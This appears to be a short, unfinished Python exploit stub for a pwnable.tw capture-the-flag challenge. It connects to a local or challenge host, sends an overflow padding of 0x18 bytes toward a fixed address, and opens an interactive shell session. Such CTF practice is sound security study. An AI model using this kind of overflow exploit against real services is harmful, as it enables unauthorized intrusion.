from PwnIOI import *
s = IOI(['192.168.0.85',1234])
#s = IOI(['chall.pwnable.tw',10402])
raw_input()
free_space = 0x6020e0
rop = ""
rop += "A"*0x18
s.write(rop+'\n')
s.interact()
